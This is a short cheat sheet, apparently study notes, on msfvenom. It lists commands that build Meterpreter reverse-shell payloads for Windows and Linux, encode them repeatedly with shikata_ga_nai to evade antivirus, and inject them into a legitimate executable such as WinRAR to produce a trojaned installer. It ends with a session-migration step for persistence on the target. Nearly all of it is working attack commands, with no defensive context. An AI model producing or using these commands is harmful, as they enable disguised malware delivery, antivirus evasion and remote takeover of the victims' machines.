
Msfvenom Payloads
=
setup handler with exploit/multi/handler in msf

use encoder to evade AV

x86 - 32bit
x64 - 64bit

`msfvenom`
	`--list payloads`
	`--list formats`
	`-a ARCH -p payload LHOST=LIP LPORT=LP -f exe/elf > filename.exe/elf`
	`-p windows/meterpreter/reverse_tcp LHOST=LIP LPORT=PORT -f exe > payload.exe` - windows payload
	`-p linux/meterpreter/reverse_tcp LHOST=LIP LPORT=PORT -f elf > payload` - linux payload
	

Msfvenom Encoding
=
avoids signature based AV systems

can do multiplied iterations to increase chance of evading AV

`msfvenom`
	`--list encoders`
	`-e x86/shikata_ga_nai` encoder flag for windows and linux 32bit, add into an payload command
		`-i 10`  iterations of encoding


Payload Injection Into Executables
=
requires legitimate executable like WinRAR (download it from the website)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f exe -x /path/to/legitimate.exe > winrar.exe` - injects encoded payload into a legitimate windows executable
	`-k` - keep functionality of executable (doesn't always work) otherwise exe wont function as usual


After exploitation:

`run post/windows/manage/migrate` this is to ensure connection persist if program is closed on targer